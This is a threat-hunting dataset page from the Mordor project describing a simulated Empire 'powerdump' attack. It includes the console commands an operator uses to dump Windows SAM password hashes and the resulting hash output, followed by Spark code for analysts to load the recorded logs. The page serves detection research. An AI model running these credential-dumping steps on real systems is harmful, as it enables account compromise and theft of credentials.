# Empire Powerdump

## Metadata


|                       |    |
|:----------------------|:---|
| id                    | SDWIN-190625132210 |
| author                | Roberto Rodriguez @Cyb3rWard0g |
| creation date         | 2019/06/25 |
| platform              | Windows |
| Tactic(s)             | ['[TA0006](https://attack.mitre.org/tactics/TA0006)'] |
| Technique(s)          | ['[T1003.002](https://attack.mitre.org/techniques/T1003/002)'] |
| Simulaton Environment | Mordor shire |
| Simulation Scripts    | ['https://github.com/OTRF/Blacksmith/blob/master/aws/mordor/cfn-files/scripts/Invoke-Mimikatz.ps1'] |
| Dataset           | https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/empire_powerdump.tar.gz |
| References        | None |

## Dataset Description
This dataset represents adversaries dumping hashes from HKLM:\SAM\SAM\Domains\ registry keys.

## Adversary View
```
(Empire: Y298VW3B) > usemodule credentials/powerdump*
(Empire: powershell/credentials/powerdump) > info

              Name: Invoke-PowerDump
            Module: powershell/credentials/powerdump
        NeedsAdmin: True
        OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: True
  OutputExtension: None

Authors:
  DarkOperator
  winfang
  Kathy Peters
  ReL1K

Description:
  Dumps hashes from the local system using Posh-SecMod's
  Invoke-PowerDump

Comments:
  https://github.com/darkoperator/Posh-
  SecMod/blob/master/PostExploitation/PostExploitation.psm1

Options:

  Name  Required    Value                     Description
  ----  --------    -------                   -----------
  Agent True        Y298VW3B                  Agent to run module on.                 

(Empire: powershell/credentials/powerdump) > execute
[*] Tasked Y298VW3B to run TASK_CMD_JOB
[*] Agent Y298VW3B tasked with task ID 4
[*] Tasked agent Y298VW3B to run module powershell/credentials/powerdump
(Empire: powershell/credentials/powerdump) > Job started: NPFW52
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::


Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::


DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::


WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::


Nora:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

(Empire: powershell/credentials/powerdump) >
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/empire_powerdump.tar.gz"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        